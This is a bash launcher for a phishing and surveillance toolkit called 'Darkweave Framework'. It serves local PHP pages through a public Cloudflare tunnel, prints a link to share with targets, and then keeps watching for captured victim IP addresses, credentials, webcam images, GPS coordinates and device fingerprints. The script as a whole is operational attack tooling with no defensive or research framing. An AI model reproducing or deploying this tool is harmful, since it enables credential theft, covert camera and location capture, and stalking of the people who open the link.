#!/bin/bash
# Darkweave Launcher

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

clear
echo -e "${GREEN}[+] Starting Darkweave Framework...${NC}"
echo ""

# Kill existing processes
pkill -f "php -S" 2>/dev/null
pkill -f cloudflared 2>/dev/null

# Start PHP server
echo -e "${GREEN}[*] Starting PHP server...${NC}"
php -S 0.0.0.0:8080 -t . > /dev/null 2>&1 &
PHP_PID=$!
sleep 2
echo -e "${GREEN}[✓] PHP server running on port 8080${NC}"

# Download Cloudflared
if [ ! -f "cloudflared" ]; then
    echo -e "${GREEN}[*] Downloading Cloudflared...${NC}"
    wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
fi

# Start tunnel
echo -e "${GREEN}[*] Starting Cloudflare tunnel...${NC}"
./cloudflared tunnel --url 127.0.0.1:8080 > .tunnel.log 2>&1 &
sleep 10

# Get link
LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnel.log | head -1)

if [ -n "$LINK" ]; then
    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}[✓] TUNNEL READY!${NC}"
    echo -e "${CYAN}🔗 SHARE THIS LINK: ${LINK}${NC}"
    echo -e "${YELLOW}⚠️  Press Ctrl+C to stop${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}[+] Monitoring for targets...${NC}"
    echo ""
    
    # Monitor output
    while true; do
        if [ -f "output/ip.txt" ] && [ -s "output/ip.txt" ]; then
            echo -e "${GREEN}[+] New Connection!${NC}"
            cat output/ip.txt
            echo ""
            mv output/ip.txt "output/ip_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        if [ -f "output/credentials.txt" ] && [ -s "output/credentials.txt" ]; then
            echo -e "${RED}[!] CREDENTIALS CAPTURED!${NC}"
            cat output/credentials.txt
            echo ""
            mv output/credentials.txt "output/creds_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        if ls output/cam_*.png 2>/dev/null | grep -q .; then
            for img in output/cam_*.png; do
                if [ -f "$img" ]; then
                    echo -e "${GREEN}[+] Selfie Captured:${NC} $(basename "$img")"
                fi
            done
        fi
        
        if [ -f "output/gps.txt" ] && [ -s "output/gps.txt" ]; then
            echo -e "${GREEN}[+] GPS Location!${NC}"
            cat output/gps.txt
            echo ""
            mv output/gps.txt "output/gps_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        if [ -f "output/fingerprint.txt" ] && [ -s "output/fingerprint.txt" ]; then
            echo -e "${GREEN}[+] Device Fingerprint!${NC}"
            cat output/fingerprint.txt
            echo ""
            mv output/fingerprint.txt "output/fingerprint_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        sleep 2
    done
else
    echo -e "${RED}[!] Tunnel failed. Check internet connection.${NC}"
    exit 1
fi
